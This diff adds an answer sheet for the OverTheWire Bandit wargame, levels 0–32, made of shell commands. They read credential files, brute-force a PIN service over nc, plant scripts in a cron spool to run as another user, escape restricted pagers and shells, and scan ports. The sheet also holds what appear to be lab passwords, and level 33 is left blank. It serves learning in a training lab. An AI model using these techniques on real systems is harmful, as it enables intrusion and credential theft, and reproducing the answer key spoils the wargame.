@@ -1,0 +1,178 @@
+Answers:
+# reference: YouTube: John Hammonds
+
+0.	> cat readme
+1.	> cat ./-
+2. 	> cat spa...   		(use \tab) 
+3.	> cat inhere/.hidden
+4. 	> file inhere/*			
+	> cat <file that's ASCII text>
+	-------------------------------
+	> strings inhere/*
+5.	in inhere
+	> find \! -executable -size 1033c		++++++++++++++++
+	(find not executable with size 1033 bytes)
+6.	> find -user bandit7 -group bandit6 -size 33c
+	> find -size 33c -user bandit7 -group bandit6 2>/dev/null ++++++
+		(2>/dev/null throw the error msg to garbage)
+7.	> cat data.txt | grep millionth
+8. 	> cat data.txt | sort | uniq -c | grep -v 10	++++++++++++++++
+	--------------------------------
+	> cat data.txt | sort | uniq -u			++++++++++++++++
+9.	> strings data.txt | grep =
+10.	> cat data.txt | base64 -d				--------
+11.	> cat data.txt | tr a-zA-Z n-za-mN-ZA-M		++++++++++++++++
+	--------------------------------
+	> echo <txt> | rot13
+12.	> mkdir /tmp/chou				++++++++++++++++
+	> cp data /tmp/chou
+	> cd /tmp/chou
+	> xxd -reverse data.txt > tt			++++++++++++++++
+	> mv tt > tt.gz
+	> gunzip tt.gz						--------
+	> bunzip2 tt						--------
+	> tar xf tt						--------
+13.	> ssh -i sshkey.private bandit14@localhost	++++++++++++++++
+14.	> cat /etc/bandit_pass/bandit14 | nc localhost 30000
+	--------------------------------
+	copy the password
+	> nc localhost 30000					--------
+	or telnet is also workable
+	> <the password>
+15.	> cat /etc/bandit_pass/bandit15 | openssl s_client -connect localhost:30001 -ign_eof
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+16.	> nmap localhost -p31000-32000
+	try through the open ports
+	> cat /etc bandit_pass/bandit16 | openssl s_client -connect localhost:31790 
+ 	+++++++++++++++++++ we got the RSA private key +++++++++++++++++++
+	> mkdir /tmp/bandit17
+	> cd /tmp/bandit17
+	> echo <the RSA private key> > bandit17.private
+	> chmod 600 bandit17.private
+	> ssh -i bandit17.private bandit17@localhost
+	> cat /etc/bandit_pass/bandit17
+17.	> diff passwords.new passwords.old
+18.	we can put in some command into the sshpass 	++++++++++++++++
+	> sshpass -f bandit18 ssh bandit18@bandit.labs.overthewire.org -p 2220 'ls -al'
+	and we saw there's a readme file in the directory
+	> sshpass -f bandit18 ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat readme'		
+19.	> ./bandit20-do
+	it said "run a command like another user"
+	> ./bandit20-do id
+	it said euid=bandit20 !!
+	> ./bandit20-do cat /etc/bandit_pass/bandit20
+20.	the program inside bandit20 conncects to the given port on localhost using TCP, and expects a correct password to return the next level password
+ 	(Connect to bandit20 on another terminal)
+	(another term) > nc -lv 8888			+++++++++++++++++
+	-l: listen to income connection; -v: give verbose output
+	> ./suconnect
+	(another term) > <bandit20 Password>
+	(another term) > <bandit21 Password returns>
+21.	> cd /etc/cron.d
+	> cat cronjob_bandit22
+	found that a shell script has been run every second
+	and the script cat the password into a file in /tmp
+	> cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+22.	> cd /etc/cron.d
+	> cat cronjob_bandit23
+	found that the shell script put the username into action
+	so we follow the script and set the $(whoami) to bandit23
+	and set up mytarget, then cat the right file in tmp directory
+	> myname=bandit23
+	> mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+	> cat /tmp/$mytarget
+23.	> cat /etc/cron.d
+	> cat cronjob_bandit24
+	> cat /usr/bin/cronjob_bandit24.sh
+	> cd /var/spool/bandit24
+	> mkdir /tmp/bandit23
+	> chmod 777 /tmp/bandit23
+	> vim get.sh
+		#! /bin/bash
+		cat /etc/bandit_pass/bandit24 > /tmp/bandit23/pwd.txt 
+	>  chmod +x get.sh
+	wait for 60 sec
+	> ls /tmp/bandit23
+	> cat /tmp/bandit23/pwd.txt
+24.	> mkdir /tmp/bandit24
+	> vim get.sh
+		#! /bin/bash
+		for i in {9999..0000}
+		do
+			echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+		done
+	> chmod +x get.sh
+	> ./get.sh > bruteforce.txt
+	> cat bruteforce.txt | nc localhost 30002
+25.	> ssh -i bandit26.sshkey bandit26@localhost
+	now shrink the window to reaaaaally small		+++++++++
+	press 'v' in 'more' to enter the 'vim' mode of 'more'	+++++++++
+	> :e /etc/bandit_pass/bandit26				+++++++++
+26.	For this challenge, from the former challenge we know
+	we need to shrink the window / enlarge the text size
+	to get into 'more' and the 'vim' mode of it
+	> :set shell=/bin/bash
+	> :shell
+	then we enter the shell of bandit26
+	> ./bandit27-do cat /etc/bandit_pass/bandit27
+27.	> mkdir /tmp/bandit27
+	> cd /tmp/bandit27
+	> git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+	enter the same password for bandit27
+28.	> mkdir /tmp/bandit28
+	> cd /tmp/bandit28
+	> git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+	enter the same password for bandit27
+	> cd /repo
+	> cat README.md
+	> git log
+	use git show <commit #> to see what changes
+	> git show 196c3edc79e362fe89e0d75cfeef079d8c67beef	+++++++++
+29.	same way to load the git repo
+	> git log
+	> git branch
+	> git branch -a						+++++++++
+	> git checkout remotes/origin/dev			+++++++++
+	> git log
+	> git show <data needed for development>
+	( > git log | grep "commit" | cut -d " " -f2 | while read line;
+		do git show $line; done | less
+30.	same way to load the git repo
+	> cd .git
+	> cat packed-refs
+	> git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea
+		the commit # for "secret"
+31.	same way to load the git repo
+	> cat README.md
+	> echo 'May I come in?' > key.txt
+	> git add key.txt
+	> git add key.txt -f
+	> git commit -m 'key'
+	> git push
+32.	there's a file that will uppercase everything you type
+	> ./uppershell
+	> $0	(this can bring us to shell)			++++++++
+	> cat /etc/bandit_pass/bandit33
+	--------------------------------------------
+	> mkdir /tmp/bandit32
+	> cd /tmp/bandit32
+	> vim SCRIPT.SH
+		#! /bin/bash
+		cat /etc/bandit_pass/bandit33
+	> chmod +x SCRIPT.SH
+	> ~/uppershell
+	> ./SCRIPT.SH
+33.	
+	> 
+	use 
+	> 	
+		
+
+
+
+
+
+
+
+
+	
